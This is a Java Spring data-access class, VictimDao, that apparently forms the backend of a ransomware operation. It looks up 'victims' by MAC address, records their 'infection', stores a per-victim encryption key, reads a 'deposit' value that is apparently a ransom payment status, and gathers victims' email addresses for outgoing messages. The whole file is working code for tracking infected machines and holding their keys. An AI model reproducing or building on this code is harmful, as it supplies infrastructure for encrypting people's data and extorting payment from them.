package com.example.demo.Dao;

import javax.sql.DataSource;

import com.example.demo.Exceptions.EncrptsFailedException;
import com.example.demo.Exceptions.injectionFailedException;
import com.example.demo.SQLs.SQL;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Component;

import java.sql.PreparedStatement;
import java.util.List;

@Component
public class VictimDao {

    private JdbcTemplate jdbcTemplate;

    public VictimDao(DataSource dataSource) {
        this.jdbcTemplate = new JdbcTemplate(dataSource);
    }


    public boolean findVictims(String macAddress) {
        Integer result = jdbcTemplate.queryForObject(SQL.FindVictim, Integer.class, macAddress);
        if (result < 1) {
            return false;
        }else{
            return true;
        }
    }
    public void userInfection(String macAddress) throws injectionFailedException {
        int result = jdbcTemplate.update(connection -> {
            PreparedStatement preparedStatement = connection.prepareStatement(SQL.injection);
            preparedStatement.setString(1, macAddress);
            return preparedStatement;
        });
        if(result == 0) {
            throw new injectionFailedException();
        }
    }
    public void encrpts(String key,String macAddress) throws EncrptsFailedException {
        int result = jdbcTemplate.update(connection -> {
            PreparedStatement preparedStatement = connection.prepareStatement(SQL.encrpts);
            preparedStatement.setString(1, key);
            preparedStatement.setString(2, macAddress);
            return preparedStatement;
        });
        if(result == 0) {
            throw new EncrptsFailedException();
        }
    }
    public String deposit(String macAddress)  {
        String result = jdbcTemplate.queryForObject(SQL.deposit, String.class, macAddress);
        if (result.length()<1) {
            return "fail";
        }else{
            return result;
        }
    }
    public void email(String macAddress,String email) throws EncrptsFailedException {
        int result = jdbcTemplate.update(connection -> {
            PreparedStatement preparedStatement = connection.prepareStatement(SQL.email);
            preparedStatement.setString(1, email);
            preparedStatement.setString(2, macAddress);
            return preparedStatement;
        });
        if(result == 0) {
            throw new EncrptsFailedException();
        }
    }
    public List<String> sendEmail()  {
        List<String> list = jdbcTemplate.query(
                SQL.sendEmail,
                (resultSet, i ) -> {
                    String email =  resultSet.getString("email");
                    return email;
                }
        );
        return list;
    }
}
